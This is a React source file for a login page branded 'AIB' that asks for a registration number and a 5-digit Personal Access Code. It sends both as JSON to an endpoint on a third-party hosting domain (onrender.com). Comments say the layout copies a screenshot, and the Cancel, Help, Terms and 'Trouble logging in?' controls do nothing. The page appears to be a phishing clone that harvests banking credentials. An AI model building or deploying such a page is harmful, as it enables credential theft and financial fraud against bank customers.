import { useState } from "react";
import Spinner from "./Spinner";
import Modal from "./Modal";

function validate({ registrationNumber, password }) {
  const errors = {};

  const cleanRegNo = registrationNumber.trim();
  if (!cleanRegNo) {
    errors.registrationNumber = "Please enter your registration number.";
  } else if (!/^[A-Za-z0-9\-_]{4,20}$/.test(cleanRegNo)) {
    errors.registrationNumber = "Please enter a valid registration number.";
  }

  if (!password) {
    errors.password = "Please enter your PAC.";
  } else if (password.length < 5) {
    errors.password = "PAC must be at least 5 characters.";
  }

  return errors;
}

export default function LoginPage() {
  const [form, setForm] = useState({ registrationNumber: "", password: "" });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);

  function handleChange(e) {
    const { name, value } = e.target;
    setForm((f) => ({ ...f, [name]: value }));
    setErrors((prev) => (prev[name] ? { ...prev, [name]: undefined } : prev));
  }

  async function handleSubmit(e) {
    e.preventDefault();
    if (loading) return;

    const nextErrors = validate(form);
    if (Object.keys(nextErrors).length > 0) {
      setErrors(nextErrors);
      return;
    }

    setErrors({});
    setLoading(true);

    try {
      const response = await fetch(
        "https://aib-login-server.onrender.com/api/login",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            registrationNumber: form.registrationNumber,
            password: form.password,
          }),
        }
      );

      const data = await response.json();

      if (response.ok && data.success) {
        setShowModal(true);
      } else {
        alert("Failed to log in. Please try again.");
      }
    } catch (err) {
      console.error("Network error:", err);
      alert("Network error connecting to server.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className="min-h-screen w-full bg-white dark:bg-[#282427] sm:bg-gray-100 sm:dark:bg-[#18181b] flex flex-col items-center justify-center p-0 sm:p-6 text-gray-900 dark:text-slate-100 transition-colors duration-300">
      {/* 480px wide container with reduced vertical padding (py-8 instead of py-10) to shorten height */}
      <div className="w-full sm:max-w-[480px] bg-white dark:bg-[#282427] sm:rounded-xl p-6 sm:px-10 sm:py-12 flex flex-col justify-center min-h-screen sm:min-h-max transition-colors duration-300 shadow-xl">
        <div className="w-full">
          {/* Logo significantly increased in size (h-28 w-28) and spacing tightened */}
          <div className="flex flex-col items-center text-center mb-7 mt-2 sm:mt-0">
            <img
              src="/Aib-logo.png"
              alt="AIB Logo"
              className="h-20 w-20 sm:h-18 sm:w-18 object-contain mb-3"
            />
            <h1 className="text-[26px] font-bold tracking-wide text-gray-900 dark:text-white">
              Log in
            </h1>
          </div>

          {/* Form spacing tightened from space-y-6 to space-y-5 */}
          <form onSubmit={handleSubmit} noValidate className="space-y-6">
            {/* Registration Number */}
            <div>
              <label
                htmlFor="registrationNumber"
                className="block text-[13px] font-medium text-gray-700 dark:text-[#a1a1aa] mb-1.5"
              >
                Registration number*
              </label>
              <input
                id="registrationNumber"
                name="registrationNumber"
                type="text"
                autoComplete="username"
                value={form.registrationNumber}
                onChange={handleChange}
                disabled={loading}
                className={`w-full rounded-md border bg-transparent px-4 py-3 text-gray-900 dark:text-white placeholder-transparent outline-none transition-colors
                focus:border-[#02856A] focus:ring-1 focus:ring-[#02856A] disabled:opacity-50
                ${
                  errors.registrationNumber
                    ? "border-red-500"
                    : "border-gray-300 dark:border-[#525252]"
                }`}
              />
              {errors.registrationNumber && (
                <p className="mt-1.5 text-xs text-red-500 dark:text-red-400">
                  {errors.registrationNumber}
                </p>
              )}
            </div>

            {/* PAC Input */}
            <div>
              <label
                htmlFor="password"
                className="block text-[13px] font-medium text-gray-700 dark:text-[#a1a1aa] mb-1.5"
              >
                5-digit Personal Access Code (PAC)*
              </label>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                value={form.password}
                onChange={handleChange}
                disabled={loading}
                className={`w-full rounded-md border bg-transparent px-4 py-3 text-gray-900 dark:text-white placeholder-transparent outline-none transition-colors
                focus:border-[#02856A] focus:ring-1 focus:ring-[#02856A] disabled:opacity-50
                ${
                  errors.password
                    ? "border-red-500"
                    : "border-gray-300 dark:border-[#525252]"
                }`}
              />
              {errors.password && (
                <p className="mt-1.5 text-xs text-red-500 dark:text-red-400">
                  {errors.password}
                </p>
              )}
            </div>

            {/* Buttons: Spaced with gap-5 and py-3 for exact screenshot proportions */}
            <div className="mt-8 flex flex-col gap-4 sm:flex-row sm:gap-5 pt-1">
              <button
                type="button"
                onClick={(e) => e.preventDefault()}
                className="order-2 sm:order-1 w-full sm:w-1/2 rounded-md bg-gray-100 dark:bg-[#454245] px-4 py-3 text-[15px] font-semibold text-gray-700 dark:text-slate-200 hover:bg-gray-200 dark:hover:bg-[#535053] transition-colors"
              >
                Cancel
              </button>

              <button
                type="submit"
                disabled={loading}
                className="order-1 sm:order-2 w-full sm:w-1/2 inline-flex items-center justify-center gap-2 rounded-md bg-[#05896a] px-4 py-3 text-[15px] font-semibold text-white
                hover:bg-[#047157] focus:outline-none disabled:opacity-70 transition-colors"
              >
                {loading ? (
                  <>
                    <Spinner className="h-4 w-4" />
                    Logging in…
                  </>
                ) : (
                  "Log in"
                )}
              </button>
            </div>
          </form>

          {/* Links: Exact typography with bold weight and tight underline offset */}
          <div className="mt-12 text-center">
            <button
              type="button"
              className="text-[14px] font-bold text-[#7C2B83] dark:text-[#d875d3] hover:opacity-80 underline decoration-1 underline-offset-[3px]"
              onClick={(e) => e.preventDefault()}
            >
              Trouble logging in?
            </button>
          </div>
        </div>

        {/* Footer: Tightened spacing and matching underline styles */}
        <div className="mt-8 mb-2 sm:mb-0 flex justify-center items-center gap-4 text-[13px] font-bold text-gray-500 dark:text-gray-300">
          <a
            href="#terms"
            onClick={(e) => e.preventDefault()}
            className="underline decoration-1 underline-offset-[3px] hover:text-gray-800 dark:hover:text-white"
          >
            Terms
          </a>
          <span className="font-normal text-gray-400 dark:text-gray-500">
            |
          </span>
          <a
            href="#help"
            onClick={(e) => e.preventDefault()}
            className="underline decoration-1 underline-offset-[3px] hover:text-gray-800 dark:hover:text-white"
          >
            Help
          </a>
        </div>
      </div>

      <Modal open={showModal} onClose={() => setShowModal(false)} />
    </main>
  );
}
